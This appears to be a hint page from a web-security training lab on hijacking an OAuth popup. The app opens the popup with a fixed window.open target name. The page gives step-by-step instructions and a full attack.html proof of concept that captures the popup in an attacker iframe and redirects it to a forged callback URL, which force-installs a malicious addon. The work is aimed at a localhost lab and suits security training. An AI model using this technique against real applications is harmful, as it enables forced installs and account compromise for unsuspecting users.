Hint: WorkHub window.open Hijack

The app uses window.open(url, 'workhub-addon-oauth', ...) with a fixed target name. Pre-register an iframe with that same name on your attacker page — the OAuth popup loads INSIDE your iframe.
1
Find the predictable name›
Open DevTools Sources. Search for window.open. The second arg is a static string: 'workhub-addon-oauth'. Per HTML spec, window.open reuses any existing browsing context (popup or iframe) with that name.
2
Build the attacker page›
On any HTML page you control, create an iframe with name="workhub-addon-oauth". Since the test runs on localhost, open a second tab with a local HTML file. 
<iframe name="workhub-addon-oauth" src="about:blank"></iframe>
3
Trigger the install flow›
Open WorkHub in one tab, click "Connect" on ANY addon and confirm install. The popup opens... inside your attacker iframe. The iframe's onload tells you the hijack worked.
4
Force-install the malicious addon›
Instead of completing OAuth for the addon the user picked, redirect your iframe to the /api/addons/callback?code=X&state=addon_malicious-addon URL. The server treats the state as legit, installs the malicious addon, and posts success to the opener.

Create attack.html on your disk and open it:

<!DOCTYPE html>
<html><body>
<h2>WorkHub addon hijack PoC</h2>
<button onclick="openTarget()">1. Open WorkHub</button>
<iframe id="hijack" name="workhub-addon-oauth" src="about:blank" width="400" height="300"></iframe>
<script>
function openTarget() {
  window.open('http://localhost:3000/labs/realworld/window-open-hijack.html');
}
document.getElementById('hijack').onload = function() {
  if (this.src === 'about:blank') return;
  // The OAuth popup landed in our iframe — redirect to malicious addon callback
  this.src = 'http://localhost:3000/api/addons/callback?code=STOLEN&state=addon_malicious-addon';
};
</script></body></html>

Flow: open attack page → click "Open WorkHub" → in WorkHub click Connect on any addon → the popup loads inside your iframe → iframe onload fires → we redirect iframe to the malicious addon's callback URL → server installs "malicious-addon" → callback page's postMessage tells WorkHub it succeeded.
